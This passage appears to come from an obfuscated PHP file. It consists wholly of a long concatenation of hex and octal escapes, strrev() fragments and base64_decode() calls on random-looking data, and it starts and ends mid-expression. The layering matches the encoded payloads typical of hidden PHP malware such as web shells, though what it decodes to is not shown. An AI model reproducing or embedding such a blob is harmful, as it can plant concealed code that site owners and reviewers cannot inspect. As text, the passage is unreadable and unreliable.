270\140\174\55\266\165\361\325\240\40\34\126\250\261\252\322\25\131\32\20\176\236\244\4\200\10\267\117\376\25\275\175\43\175\76\304\54\130\53\205\235"."\x58\x5b\x8b\xc2\xd8\x90\x56\x72\xb2\xa7\x2\x0\x28\x1d\x60\xdb\xe8\x4a\xf\xec\x18\x6a\xd6\xcc\x30\x9f\x2d\x88\x20\x8e\x3\xbb\x40\x7f\x97\xb1\x0\xa1\x95\x50\x0\x1d\x77\xb\x59\x66\x30\x46\x2d".strrev('BÀy¯gğy‘¥ªè„%ê;PFW¨YaÌXØö†\\’h>—™‡œj>¼ú£¾ñ¾ÔÕ')."\x74\x7e\x13\x9f\xcc\xe0\xe2\xf1\x2e\xf4\x77\x41\x7c\x3c\x88\xfe\x86\xd1\x4f\x38\x8e\xa6\xcb\xe0\x19\xd0\x92\xc\x87\x16\x5\xc7\xf1\x3f\x22\xa1\x96\xf\x24\xb5\xc1\x71\x16\x8\x75\x8d\xa3\x7f\x11"."\201\31\17\165\271\53\153\11\306\227\6\203\64\3\13\303\257\310\212\10\16\164\125\162\332\206\25\342\41\131\50\310\103\325\252\132\103\6\323\333\77\255\126\125\375\126\17\340\13"."\167\277\120\123\75\271\276\32\366\220\100\254\165\234\123\137\7\102\224\343\2\121\137\167\42\2\167\105\6\361\5\321\110\117\267\24\357\10\54\11\165\55\140\61\377\124\26\232\12".base64_decode('VSttoRgaolaGjMJDmhynYcoWyVyvA6XbEGVHEYllx4cBSpmdq6ylJxRuk42pcUYamg==')."\102\250\72\354\51\123\130\343\130\234\230\125\263\10\36\162\26\46\350\306\42\144\14\130\204\16\0\213\221\341\142\21\342\211\215\105\110\107\131\4\237\116\202\135\54\15\235\21\321"."\371\216\35\374\6\264\141\156\15\70\67\225\220\174\63\140\32\354\243\62\63\354\241\3\235\342\64\56\331\164\211\105\211\204\112\72\370\123\215\66\105\62\112\366\123\20\342\66\11".strrev('l¢!'."\0".'ËQ²i2Jj ySŸ°;éD³	_C°ñÖvÕòÔ˜†JğÜ&l­öı').base64_decode('9gpBDtbkI2JgGnUeoThdWslPRuD2xAO/0KIf0J8+iDKhBZiFVHtgk2WmBM7TcV9f1Q==')."\104\243\5\31\330\230\101\264\212\106\131\51\30\110\264\347\45\7\260\217\17\325\316\61\1\70\71\234\11\121\63\25\127\213\170\133\64\322\115\71\20\45\324\256\120\377\2\112\65"."\25\160\127\3\153\325\32\15\342\325\101\163\261\264\232\152\207\70\152\176\265\2\306\306\265\316\122\241\256\266\340\62\245\332\110\215\252\232\246\102\141\5\255\105\126\221\122\126\23"."\253\201\266\25\156\166\254\1\163\104\221\321\213\235\227\133\51\54\56\120\256\214\65\43\236\2\230\141\247\7\16\345\74\205\162\304\64\51\24\103\33\166\70\114\172\212\222\14\13".base64_decode('M7IehRv0YyA+fFCRJ1TEEmhFNCm4LB4NYCDhPvfZG/0hBAWfjoo5jVo7Ep7NtxKEBA==')."\x2b\x1d\x2c\x22\x65\x1e\x31\x93\x8\x18\x44\xb6\x3c\xa9\x4f\x3c\x85\x48\xa\xe8\x30\xcb\x72\x84\x45\xc0\x75\xd3\x58\x77\x34\xd4\x19\x88\x2e\x87\x21\x13\x67\x0\x58\x81\x66\xd6\x61\xf3\x2a\x22\x86"."\325\43\131\135\167\241\126\313\126\330\164\216\307\31\205\105\347\331\161\240\260\250\65\260\0\360\314\323\40\70\316\124\271\121\55\23\242\324\60\343\124\17\13\60\347\6\304\340\207"."\x49\xaa\x72\x88\xe4\xf0\x98\x98\x35\xc0\x7d\x98\x15\x39\x55\x36\x59\x12\x9e\x3d\xf1\x26\x89\x27\x19\x16\x40\xb0\x3d\xd0\x13\x96\x21\x30\x54\xca\xa2\xe0\xf2\x6f\x58\x23\xac\xa5\x95\xd6\x8\x4b\x63"."\xe2\x18\xbe\xda\xa0\x3f\x35\xd\xd0\x3f\xea\x6f\xa1\x66\x3a\x3a\x93\x96\xf2\xd8\xa1\x8\xf7\x2b\x8\xad\xa2\xb1\x40\x4f\x3c\xa2\xa2\xfd\x23\x1a\xc4\xd4\x1c\x7a\xc4\x87\x55\x6a\xaf\x74\xee\x96\x27"."\x5\xaa\xc1\x19\xb8\x9b\xd4\x6f\xe8\x1a\xcb\x53\xa9\x6b\xbc\x3c\x97\x3c\x5\xbb\x16\x84\xba\x82\x4d\x9d\x63\xa1\x58\xa0\x53\x61\xd\x7\xd9\x1a\xf6\x26\x78\x34\xd4\x13\x8a\xa8\x61\xc4\x13\xab\xb2"."\370\54\24\1\41\257\303\67\235\252\12\237\35\76\115\150\67\333\305\222\344\266\314\60\211\46\161\47\67\72\40\252\317\10\41\2\302\126\237\13\242\111\132\51\201\113\313\333\25".base64_decode('lHd5hDTMRpyCM1MuZa7Irjo+7lYdlsFCq1nc47J7Y+7tDAr0SLb2uLDCPkhucvLO5g==').base64_decode('of0yy5wEqbroTU63LH6fSw4/LGgPCFcDskPOthY2cqW8HdOzIFVvSxCdcGGwJYxiJA==').base64_decode('XXFyOSKmg/pGcxWEmkK8v1IuAQwLD5z4LkLU2c+O8KKTqw22s7lv9Xgj82a3XswZ5A==')."\x2\x66\xa9\xb8\x5f\xe1\xe9\xba\x8c\x0\x95\x6\xd8\x5b\x2f\x7d\x41\xb2\xba\xc3\x51\x98\x48\x7c\xc3\x28\x19\x36\x94\xf2\xa8\x5d\x5e\xd9\x54\x6\x4d\x2c\x1\x4a\xca\xf9\xcc\x21\x1c\x8d\xcd\x6\x55"."\24\204\74\20\140\372\104\354\267\310\122\174\302\225\12\251\23\363\56\136\341\332\40\245\311\146\211\222\337\351\43\345\31\47\123\47\20\57\155\310\176\16\174\302\31\51\307\345\143"."\370\200\143\163\135\270\26\307\174\160\132\225\332\322\315\363\47\271\327\151\72\32\322\60\23\0\15\222\325\247\64\212\106\164\240\226\232\305\61\11\7\44\150\47\363\376\3\256\120"."\xc3\x26\x70\xac\xd8\xba\x40\xb7\xc1\xef\x93\x83\x78\x84\x22\x50\xd6\xa7\x63\x53\x1d\x6a\x38\x81\xd\xab\x78\x41\xea\xc8\xeb\xdb\xb\xf5\x48\xde\x60\x27\x58\xef\x15\xcb\xb5\x42\x46\xfe\xc1\x22\x91"."\345\174\373\7\243\272\330\222\121\61\142\31\365\255\205\4\375\43\137\42\205\44\232\351\52\103\320\221\132\161\300\314\17\100\262\300\61\104\250\273\42\152\7\332\13\42\214\143\60".strrev('ëÃQyKYı'."\0".'êv%&p	õ1*Èƒ^É„@½>5ÉscÎ´Äı$ĞÄl'."\n".'@R²öƒ¸¬')."\122\272\315\235\370\140\152\306\314\360\160\233\45\63\335\34\247\176\43\222\363\112\155\130\307\206\120\114\332\121\246\305\2\135\51\357\34\64\21\337\112\305\42\75\121\166\165\202\343"."\130\144\244\106\203\255\313\371\55\6\207\266\7\226\270\41\41\54\362\13\54\250\10\346\202\50\14\47\47\76\65\32\301\22\273\140\270\335\125\40\326\301\235\215\72\141\152\70\324".base64_decode('tahiAuIbOqUiFBiKBzvdMGcNsWAgyhzZ4nhLONIqJYci5SPBGRMOpPI+CvSvqOlbQw==')."\x8e\x2c\x8d\xe8\xe4\x92\x1a\xc7\x82\x1\xaf\xda\x3f\xad\xb6\xb9\x6f\x6d\x6d\x4d\x9f\xbf\xd9\x37\x95\xcb\xb3\x28\xb9\x92\x8c\x3d\x27\x0\x5b\x6c\x13\x69\x74\x3\xf0\xfe\xc3\x80\xb4\x18\xc4\xfc\x3e".base64_decode('H3yEB/x9fuYpyi8S4Vfk55sHOJCOUX87jha63FIwi2+f20xJZbZJEMWWpipfevhWVA==').strrev('a˜ÃØK&e9ë2Å0Ïek¬;.Fb¦3X¬å»FepSVY‘H¨ÂrIñ-')."\x8b\x8b\x40\x3e\x47\x15\x88\x92\xf\x8a\xc3\x37\x2c\xc7\x18\x5b\xb6\x79\xb4\x49\xc2\x2e\xdc\x8a\x78\xc9\x5\x1d\xa1\x85\x8b\xc2\x9d\x5d\x91\xee\xc5\xd1\x58\xbc\x67\xc9\xd2\x65\xcb\xc1\xcd\x61\x23"."\303\226\264\342\145\16\272\300\171\247\177\130\53\372\207\231\363\360\45\370\50\240\133\176\231\305\342\100\324\107\354\275\225\71\335\242\22\2\236\212\311\206\277\162\22\255\315\237\313"."\xdb\xf5\x13\xe4\xe8\x2e\xea\x9\xd3\xb4\x27\x48\x5d\xd2\xf9\xcd\x15\x43\x62\x6f\x9f\xd5\xcf\xd1\x33\xa5\xf\x43\x50\xa8\xa2\x59\xe2\x0\x4\xdc\x85\x57\x76\x62\x8e\xb1\x55\x66\xf8\x52\x9\x17\x1b"."\0\0\341\247\125\142\26\4\220\373\357\245\321\61\166\11\102\274\142\111\376\157\301\47\345\2\354\223\222\371\243\34\42\236\22\335\156\26\207\274\332\240\43\135\170\300\35\362\242"."\x3\xa2\x23\xee\x72\xb5\x88\x95\x11\xb8\x1b\x5c\x1c\xb1\x78\x4c\x5e\xa\x64\xa3\xe0\xda\x34\x78\x3b\xea\x70\x2d\x44\xe\xe4\x4e\x1b\x62\x44\xe7\xb0\x51\x99\x9\xbe\xbe\xdb\x11\x63\x9c\x52\x7a\x29".base64_decode('rwticsxfEXfVNOpRhGdgJuB0uvxla4E4ZBEMdFI2zGckNTco1LZyg1zFIulgKfDu3Q==').base64_decode('Lml3Ca4BfPSjtJYxpiIFJowtY1HpiRGHUwT5VQOtUGgdwH1wLFAHKClHGIFMYwURWQ==')."\xb1\x4\x64\x78\x54\xc7\xd4\x87\x92\xdb\x28\xb\x97\xe2\xf9\x2d\x11\xe2\x13\x98\x96\xa6\xd6\x51\x1d\x14\xf3\xe3\x6b\x6b\x1a\xcc\x6a\x96\xbd\xc4\xe1\x48\xe6\x5b\xbd\xf2\x62\xaf\x8\x9d\x9c\x4d\xe5"."\34\222\337\264\54\77\166\150\107\370\102\256\70\25\211\261\333\11\147\137\250\56\213\164\214\4\237\132\334\243\54\367\67\53\234\322\122\241\62\15\7\271\347\17\304\336\6\62\330"."\331\203\231\147\117\125\4\107\13\246\245\313\356\216\123\72\161\260\310\355\236\45\207\301\71\155\24\57\26\246\133\46\271\16\106\14\123\206\217\42\361\215\52\373\271\303\103\347\315"."\x39\xfc\xd8\x8f\x7a\xd1\x20\xb8\x1c\xf2\x5a\xba\x3e\xc8\x74\xe1\x24\xa6\x97\x1f\x6c\xbb\xb9\xa3\x5d\x77\xc7\x30\x12\x8b\x15\x5c\xe4\x5e\x96\xe9\xcd\xa4\xb7\x22\xc0\x2b\xe9\xc2\x51\x3c\x96\xdc\xa9"."\343\306\301\221\167\200\214\15\73\13\323\237\143\53\365\325\133\24\376\216\321\134\322\327\21\26\351\143\314\227\260\213\254\270\334\17\367\55\350\353\354\213\313\203\143\27\265\164\32"."\65\126\362\167\351\150\213\360\166\14\350\107\36\64\140\103\60\261\257\144\20\273\37\125\321\325\62\44\22\336\326\137\44\316\275\75\43\234\133\360\223\227\121\52\340\356\142\14\7"."\354\115\13\245\314\102\111\172\234\107\306\27\274\43\160\125\55\174\46\246\176\251\31\241\47\236\243\341\211\201\46\326\43\64\164\371\26\63\5\233\347\232\52\204\211\125\215\125\223".base64_decode('a9BvbZWnCrM9JI5xEQNIO6oaJ9eQQC247VgNRgOSa09x1wtinGY0tNIFRTMZDbz2pw==')."\373\247\373\107\200\36\64\17\341\57\212\167\102\334\116\226\107\125\55\267\232\11\336\125\331\221\60\270\50\206\121\227\123\72\170\113\230\213\341\316\66\250\176\231\67\320\171\254\127"."\70\333\235\327\74\232\313\52\160\236\151\252\256\367\325\125\53\354\35\231\246\352\236\170\273\367\350\352\346\371\373\314\153\45\327\225\266\336\211\357\33\361\151\233\36\63\347\303\165"."\302\74\274\250\170\304\357\214\115\124\26\360\57\247\255\66\363\332\210\205\50\124\316\227\204\301\354\341\124\114\70\272\316\353\366\210\131\204\273\130\140\317\246\327\315\224\161\32\120"."\304\142\13\232\210\66\32\261\4\216\165\277\247\60\126\312\173\361\141\327\33\223\335\262\271\136\76\250\163\346\307\307\125\147\176\231\64\46\5\321\310\211\40\175\350\242\121\221\137"."\77\221\274\313\22\121\10\135\225\114\255\0\140\230\152\62\220\240\240\151\241\32\216\11\241\352\44\204\307\270\332\213\207\332\213\370\2\214\377\150\121\331\206\344\32\132\316\342\174"."\x3f\xc3\xfd\xaa\x86\x7b\x14\x48\x11\x3c\xb9\x5e\xf9\x45\x8f\x51\xc4\xbc\xe1\x64\xec\x8\xde\x8b\xe7\xd7\x6b\xa4\x26\x4a\x11\x8b\xba\x62\x53\x93\x80\x2a\x95\xb2\xf4\x94\x8c\x94\xfb\x93\xe4\xfa\xdb"."\x5b\x2a\xb1\xf\x56\xac\x54\x66\x2d\x59\x6\xd2\x89\x10\xaf\x4f\xf6\x30\x8e\x8f\xde\x5e\x2e\xed\x77\x3b\x30\x17\xec\xb8\x56\xee\x6d\x1d\x2d\x5e\x65\xfa\x8c\xc6\x86\x39\x8d\xcc\xb8\xed\x28\x76\x7b"."\137\52\60\215\134\24\144\336\330\217\364\247\31\35\20\17\152\260\276\341\11\227\374\326\73\300\142\30\371\12\147\4\304\221\117\264\326\361\232\13\164\224\236\6\45\377\372\104\106"."\x4b\x57\x12\xd6\x69\x51\xf9\x83\x4\x15\x28\x29\xe2\xeb\x1\x45\xd9\xeb\x15\xd2\xbb\x9\x7c\x42\x32\x2c\x50\xe4\xf9\x35\xb1\x44\x12\xd9\x41\xd1\x93\x4\x56\x3e\x6\xc\x1f\x44\xd\x35\x5\x7b\x45"."\x36\x5a\x59\x0\x3a\x50\xca\xf\x36\x49\x89\x8a\x6d\x9a\x4a\x4e\xcb\x8f\x1d\x49\x81\x53\xac\xc6\x29\xd6\x5c\xfc\xa1\x26\xac\x76\x6d\x4d\x61\xcf\x5b\x8\xdf\xa4\x78\x1f\x11\x5e\xe7\xa8\xcb\x14\x48".strrev('ï…X)±œa1]İĞ5.¶ÖÔ#z¤—P‚Ïp„	hA‡“ur	h©7‡Åâ~i¡').strrev('&ˆIxš¤¢.5H 3Îƒ$£ ~U­2LUŠU¡…TßÇ¬I(Ë‘j°É?8˜«}­')."\x57\xcf\x9f\xe7\x37\xe6\xf3\xc1\x16\xe\x6a\x8a\xa6\x30\x53\xf0\xf9\x7f\x81\xb9\x7f\x3f\x56\x6e\xc9\x1f\x85\x67\x57\xbe\x6b\x27\xd0\x76\xe1\x8e\x46\x51\xe6\x69\xa\x1d\xc7\xa6\x6a\x22\x71\xad\x56"."\6\320\176\314\65\373\346\273\13\167\261\13\217\171\176\115\116\304\53\53\152\62\366\227\63\375\303\334\341\132\105\241\171\100\362\347\114\36\156\150\325\362\113\312\213\340\312\175\111"."\x39\xa9\x97\x9a\x66\xf4\xcb\xf3\x4a\xcc\x2a\xca\x4b\xfb\xc9\x11\xd3\x2f\x4e\x3b\x2a\x7d\xe3\xac\xf2\x95\x3\x97\xd0\x57\xc0\x18\x7c\xd7\x8d\x10\x9e\x5d\x32\x6a\xc9\x41\x8c\x72\x62\x7f\x80\x66\x40".base64_decode('Qjc+u9AEhyN7W9I+KGGrIyLvLYpHb9asoRVhlmDt2nIYKDC6kwIFww3CqOWG4TOkgA==')."\241\215\316\371\31\212\326\162\46\1\141\171\350\257\50\23\356\132\40\42\364\314\342\110\354\145\272\302\44\326\327\133\355\233\272\166\255\337\140\152\76\114\45\201\225\365\361\334\64"."\336\347\163\346\107\75\201\241\347\31\1\340\316\111\31\314\205\260\72\367\361\117\25\226\122\134\235\107\301\72\76\115\115\363\173\371\155\106\77\113\143\134\242\121\177\64\103\201\325".base64_decode('A974Uh5s7RJ8sHgCRx421wqhxMhHxAEBp5vYZvEwkFyUhgOFghz1swgWg2eNhJ+TCg==')."\52\32\367\45\205\361\21\313\102\10\225\13\216\365\164\134\11\370\101\36\2\36\106\224\24\261\154\253\334\160\124\27\7\362\300\74\53\131\64\12\266\203\310\321\27\40\253\310\53"."\x2f\xab\xb4\x61\x8d\x66\xa9\x52\xe0\x50\xdf\x54\x45\x7c\xa0\x57\x21\xa2\x46\x53\x80\x9a\x88\xa6\xcc\xc3\xd4\x4b\x29\xea\xd9\xa6\x2a\xd2\x5c\x6b\x40\xd7\x51\x79\x42\x9f\x2a\x7d\x4\x15\xac\x52\x18".base64_decode('ac1pfMSKtol2TW7QAi9j9UTBAiDQBVcPv1hBfyf/gmEPecItqxepfjOhVeTSK42FNQ==')."\x34\x13\xbc\xd0\xd5\x1d\x8d\xc4\x23\xad\xec\x81\x1c\xa7\x54\x87\xc2\x66\x32\xae\xd7\xa2\x6\x5b\xe2\x74\xc4\xac\x54\xb8\x1a\x0\xcb\xc1\xf9\x8\x3f\x40\x60\xde\x8b\xa5\x7c\x9e\x6b\x54\x61\xc6\x92"."\x6f\x76\xe4\xec\xac\xa7\x7c\x4a\xaf\xc6\x2e\x43\x80\x44\xd2\xdb\x9d\xd8\x40\xc9\x16\x1b\x28\xf6\x9a\x1e\xc7\x56\xa9\x16\x80\x25\x97\x73\xd8\xe1\x1d\xaa\xa8\x97\xda\xc6\x36\xd5\x31\xa3\x3\xa6\x90"."\45\254\222\260\126\210\272\60\26\351\142\217\135\300\166\112\114\155\132\303\241\140\127\134\15\301\116\132\77\175\266\257\116\330\277\120\347\231\255\374\12\36\76\132\241\71\124\166\31"."\347\272\123\172\336\41\153\241\335\310\232\314\241\337\364\272\272\72\157\135\75\372\237\151\377\62\67\142\215\165\165\145\131\352\352\32\311\377\64\201\210\26\141\36\235\51\210\226\60".strrev('H	3~î˜ƒ@¹'."\n".'`[Ç#ÑgâBšî„ô`ÓpRc6+o[ìb_#CıtF"')."\301\166\176\352\57\25\76\204\216\50\371\14\31\24\150\57\267\212\103\331\4\352\315\245\6\211\115\274\121\301\174\252\127\376\230\217\15\56\5\12\317\301\136\226\340\225\275\367\103"."\41\272\323\10\331\273\243\151\250\214\323\201\37\206\40\226\40\311\373\211\1\222\104\6\263\204\222\123\102\34\225\105\354\44\231\233\226\221\130\226\133\277\343\150\27\257\211\76\22"."\101\237\16\203\61\254\200\371\3\346\210\52\66\165\34\135\310\143\144\110\361\341\214\241\141\112\62\377\303\343\312\110\270\224\235\113\261\304\365\71\150\3\20\223\360\101\43\353\60".base64_decode('hFWlovLYzsUZWU/izpK4IkQEAvypDKqdx9qmwCqmUeJHmLw2SBUqG/cpm1zbPbFkjg==').base64_decode('iqawai3TiWExaaaYLDn2LWorDBJkACoFb+Xe+6QK3EmuMgEqgi4rAPDy3ERSXyE3hg==')."\xbb\x72\x13\x3f\x7d\xad\xdc\x1d\xa9\xec\xbc\x8f\xde\x86\x4b\x1a\x18\x16\x78\x50\x17\xd7\xdf\xac\x8e\x61\xe9\xdc\xe6\x2b\x14\xcd\xc\x9a\x75\x4b\x1e\x34\x4\xef\xae\xc\xe6\xd9\xcb\x73\x56\xc8\xc4"."\133\57\347\223\201\370\116\200\75\13\12\350\54\254\151\65\361\52\261\224\125\260\67\22\320\271\232\245\204\126\376\242\215\14\304\347\100\131\341\201\260\343\316\72\360\1\323\11\341"."\x2d\xfb\x6\xa4\x63\x82\x1\x1b\x9e\x90\x95\x95\xf4\x68\x36\x41\x91\xb0\xd0\x46\x16\x28\xab\xe\x34\x61\xb8\xca\xf4\x2b\xf0\x8\x89\xb\x4d\x27\x9c\xc2\xe8\xd1\xdd\x71\xd1\x12\x27\x84\x2e\xab\xb3"."\27\155\51\224\56\52\134\101\230\275\314\30\163\370\272\5\64\205\245\333\324\44\27\163\246\275\261\376\34\26\70\217\345\302\303\312\45\217\262\40\36\17\251\52\113\125\360\212\356"."\340\257\244\126\100\104\47\262\225\141\25\141\65\160\5\320\32\264\232\245\30\256\35\10\231\7\35\57\55\52\0\364\140\260\102\237\16\125\362\72\267\141\166\116\252\134\0\336\225"."\61\21\13\206\135\201\312\205\160\135\75\56\22\265\310\101\21\171\133\173\111\143\231\216\227\62\305\67\35\364\317\246\60\247\362\224\36\213\333\112\77\164\273\27\165\253\37\235\21".base64_decode('xvluAhPSS6kxqxM3GUIpNj+Kc3eV9gpFrgjtuvEBLBDpV0gz5xIn5BVSsb04+xp3iw==')."\12\224\37\345\61\155\176\256\304\325\43\124\26\221\260\314\44\306\151\21\357\174\321\124\307\45\235\344\222\231\147\105\315\140\215\327\130\333\210\256\25\161\134\55\35\165\135\121\267"."\146\32\56\41\161\64\50\52\355\274\144\337\267\331\326\315\374\132\13\215\56\22\24\4\370\215\213\326\263\300\72\201\107\61\111\21\250\102\373\240\126\136\47\156\101\136\50\224\1"."\3\123\324\223\146\221\110\130\44\67\14\171\73\252\147\344\150\330\344\222\45\174\143\127\251\12\354\371\106\42\73\170\25\6\222\166\111\366\243\43\371\325\106\61\311\115\272\304\210"."\x7a\xeb\x15\xce\xc1\xaa\xb4\x66\x1a\x99\x26\x25\x90\xfc\x95\x98\x59\x97\x7c\x53\xb2\xba\x20\x22\x9d\x58\x29\xc1\xaf\x99\x5c\x2c\x26\x33\xe4\x50\x64\xe\x8e\x59\x66\xe0\xa\x88\x4b\x13\xdc\x3\x4b"."\116\103\325\142\177\266\242\147\162\21\362\315\262\42\64\15\63\121\302\61\210\234\142\141\377\347\75\154\26\53\245\124\370\24\111\222\106\64\311\135\45\301\350\210\101\202\204\61\235"."\251\102\172\353\247\173\147\324\323\260\154\345\301\16\104\64\206\117\137\22\32\340\63\42\43\143\240\110\10\371\104\36\123\272\254\43\316\102\204\133\4\342\27\205\317\47\161\240\302"."\x63\x45\x89\x97\xd0\xb9\x92\x21\xf1\x24\x22\x93\x75\xa1\x3\x40\x75\xf\x71\x86\x9e\x4a\xe9\x74\x84\x70\x72\x9b\x43\x5b\xd4\x95\x1\xad\xf\x67\x3a\xb8\x48\x17\x8d\xa1\xce\x4c\x4c\x87\x12\x8f\xab".base64_decode('EnC3LzuBJ6VEP4TKLAKZ1BG7NDBCl4H6WGG6v5zICXDc5MByfQiMlVAltX+FBydrag==').base64_decode('sf2rQ0zXOcatFLEiEd6kuY6oJUdYKkdOyxGhilOO0hzEc43ozJSViZO6O7r9HNTClw==').strrev('‚uaJ¼DÊ\\à—<ƒqB+nŒ”‹b…·Ô ²8J’3’7€áÕI;L­N×6•\'')."\xfb\xf4\xc7\x41\x6f\x2\x9d\x18\xbc\x29\x7e\xaa\xb2\xc4\xf9\x49\x7a\x4f\x5b\x7a\x1\xc9\x59\x2d\xc5\x3f\xbd\x58\x56\x63\x1e\x5b\xa8\x64\xcb\xca\x60\xa1\x71\x85\xdc\x59\x21\x22\x95\x32\x17\x8a\x7a".base64_decode('ef4xHesLSS2WCpQqtAbyV/4CeW9Bzo0YIT0/UeON/LBhGWLhsxJjcu2Bts5QlxoIhw==')."\x23\x4b\x1d\x6a\x76\x42\x5c\x5e\xe4\x8f\x59\xa4\xe4\xb7\x2f\xa4\x99\x11\x93\x40\xbf\x5e\xee\x71\xc\xfc\x35\xc9\xe\xc7\x5d\x62\x14\x3a\x7d\xb2\xf3\xb9\x2\xbb\xfc\x81\xd7\xfa\xb8\x93\x7c\x1a\x95"."\136\255\51\24\65\303\322\45\0\175\122\145\52\30\204\150\331\254\343\15\272\154\132\212\226\234\73\153\305\117\251\364\3\14\46\71\272\253\224\41\32\132\320\21\377\137\67\325\110"."\11\47\123\106\212\151\236\160\373\75\352\77\277\125\176\257\220\175\263\354\145\236\157\175\343\307\43\75\223\116\134\357\260\307\304\114\162\34\2\136\235\302\102\21\225\276\156\56\76"."\x81\xb8\x93\xe2\x58\x41\xbe\xaf\xf4\xa7\xd8\x5b\x26\x8c\xd9\xc5\xbe\xf4\x82\xec\x92\xc\x47\xc4\xc1\x4\x67\x87\xda\xf0\xe7\xe8\x71\x15\x9d\xc2\xb1\xfc\x8e\x1d\x61\x98\xda\x24\xa2\x13\x30\xce\x8e"."\xfb\x7a\xd7\x6b\x45\x6e\x25\x53\xc7\x5b\x44\x65\xdf\x20\x9e\xf1\x69\x1a\xb9\xb3\x41\x39\xfb\x45\xe7\x50\x8c\xbf\x84\x21\x8a\xba\x53\x2a\x34\x0\x25\x2b\x42\xa6\xc5\x33\x28\x4d\x4a\x1d\x7d\x38\x8b".strrev('ñ¿;\\]¬Â²pV73*Maª8œ '."\n".'š\\ÓYùG°W0UãÄâÈÖcÌ r¿')."\x4f\x9b\xf2\xf8\x11\x82\x8c\xcd\x6\xe8\x3\x77\x54\x66\xe0\x41\x47\x7\xdd\x2e\x7f\x10\x87\x16\xff\x7f\x52\x90\x26\xc6\x24\x17\x87\xce\x4a\xca\x1b\x64\xb9\xb7\x3a\xc1\x76\xe1\xb7\x7e\x6\xcc\x11"."\xe7\xab\x77\x18\xe2\x7e\xdd\xc7\xf1\xae\x8f\xb4\x68\x88\xd1\xac\xfc\x12\x91\xb3\x90\xa7\xec\xad\xd\x85\x3c\x58\xaa\x20\x54\x87\x59\xc4\x9e\x96\xd8\x99\x94\x64\x96\x3e\x3d\x85\xfe\xf4\xc1\x2f\xdb".base64_decode('ztyNoIQKPlnLkap1wMimilw1SAA6dSEoIKWwdozGHmYlL4JBd/nzHpWefMKe7JyvlA==')."\210\307\137\304\336\351\174\14\203\137\160\133\142\61\130\266\343\371\225\270\31\327\62\36\312\221\141\252\46\142\55\143\162\130\326\130\45\275\100\211\114\230\227\342\363\75\137\312\300"."\236\124\113\171\310\13\137\224\324\271\337\17\221\126\32\247\237\162\351\114\326\114\150\331\50\325\250\163\30\231\24\321\151\212\277\76\357\310\106\101\176\255\120\20\367\153\362\226\211"."\376\165\30\367\101\132\117\274\103\45\46\352\52\275\261\217\11\234\223\156\337\50\20\156\342\112\371\20\275\320\160\100\213\322\71\117\166\16\112\357\43\205\71\31\144\107\355\354\246"."\27\220\60\140\162\225\354\122\230\213\304\333\245\7\274\375\345\227\310\130\127\20\50\212\374\24\74\134\370\373\344\203\30\144\120\346\51\2\65\34\13\31\243\22\342\206\351\33\152"."\x84\x52\xc8\x8c\xfb\x37\x40\xa5\xb7\x6d\xe0\xad\xb6\x4a\x4f\xd5\x50\xcc\x27\x3f\x6d\x7a\x9a\x1f\x6a\x70\x5c\x6c\xee\xb2\x9b\xd\xa1\x6c\xe2\x7e\x46\xad\xfc\x49\x38\xf6\xfc\x1b\x5b\x3a\xf0\xf6\x5b"."\205\7\335\46\174\17\316\43\54\7\277\351\5\34\141\337\346\174\357\27\367\203\263\6\374\334\120\166\364\160\237\72\370\260\272\12\104\335\203\34\67\313\345\303\342\232\335\361\132"."\235\324\153\40\155\345\57\336\111\303\40\365\273\124\314\172\210\306\201\207\271\251\253\370\150\236\343\75\36\367\204\126\170\166\357\133\53\4\105\146\162\350\112\71\251\136\343\274\104".base64_decode('kV3TurMZDtxVi7qwfaFOQMs2iOW51PQZDXNk4YaYQnHXCcb9cAcL3IpACsUxDB6FeQ==').strrev('tuX–&êÄÅ·K¢IBé*x ²Ûeü»ãIVhœFwşÚè×¿—–êtI?W•')."\x14\xef\x32\x3a\xbf\x45\xd9\x87\xa\xfd\x10\x9f\x95\x16\xb\x7d\x57\xcf\xcc\xe2\x33\x76\xe\xcb\xee\xed\xa2\xe6\x3c\x50\x56\x3a\x37\x91\x91\x60\x87\x34\x83\xbc\x4f\xad\xbb\xdb\x4e\x6\x6\xa4\x29".strrev('¼*ZFÿ¹èU=¨Jqè‘&/ı‰6¬ZVØÛl,ù#5ˆ‘}ã‹„[¦Ú5ÉX:Y"')."\233\50\251\177\174\103\273\51\167\307\317\203\136\315\366\112\10\51\211\17\165\73\102\46\30\110\204\70\266\72\373\352\252\36\25\23\165\364\173\224\211\62\225\263\170\322\363\212\302"."\233\226\304\334\341\322\314\200\162\202\123\77\261\337\163\262\111\362\263\160\304\6\116\70\217\40\313\325\261\164\45\347\276\262\15\31\251\110\136\23\345\125\113\217\354\11\251\20\21"."\x23\x41\x8f\x60\x41\x13\x35\x6\xd2\xcc\xc0\x2\x6e\x7a\xa8\x49\x7a\x6b\x4e\x51\x15\x1e\x6a\xe9\x99\x54\x53\xe\x8b\x29\xc0\x64\x3f\xc2\xdc\xa4\xa2\xaf\x3b\x8e\x9a\x28\xde\xe6\x7a\x50\x97\x90\x28"."\367\53\273\154\210\10\135\20\44\117\262\140\165\234\153\370\63\143\216\163\216\345\176\153\20\161\173\262\333\143\24\165\277\310\12\264\221\30\10\320\257\111\273\53\153\124\106\12\165"."\225\162\42\42\311\167\311\221\212\47\72\14\175\261\213\50\27\31\140\346\303\226\353\245\121\352\204\226\206\31\347\377\377\372\231\275\377\257\136\327\153\250\143\222\170\307\103\274\13"."\200\377\206\326\342\353\116\56\217\240\122\140\127\77\234\73\350\336\200\105\374\5\152\51\316\265\240\231\233\60\346\75\114\143\267\141\132\66\53\355\263\225\117\54\145\117\234\42\344".strrev('‰hÓ§Oee\\+$m½,?‚˜ğFÄ2'."\n".'2•ı¦KÉÂW²öÏÜâ'."\r".'¸ŠVeïä')."\377\50\313\46\332\200\330\24\346\177\315\317\102\111\174\42\44\116\21\140\364\144\373\325\110\201\235\35\153\201\350\367\303\57\30\313\3\215\222\351\222\3\124\106\315\342\216\71\161"."\0\345\341\206\71\304\26\300\316\67\345\241\104\247\353\131\107\232\211\271\227\54\177\353\275\134\263\241\274\64\247\3\162\21\254\174\356\24\150\361\327\271\353\334\317\165\327\173\135"."\325\361\227\55\235\270\356\170\152\221\152\203\240\5\22\305\122\16\46\267\42\27\100\344\46\330\133\136\206\342\165\114\344\231\140\145\125\136\337\274\121\102\210\207\103\362\170\60\72".base64_decode('0V00CS/ohHLJj6T2K70yXcbeUfAUn9wR+YrUec+CTn/i4tEwifN5VrSns4ZYPwGiow==').strrev('h³Il¥~pKœ4-‰,áó¿%¡I@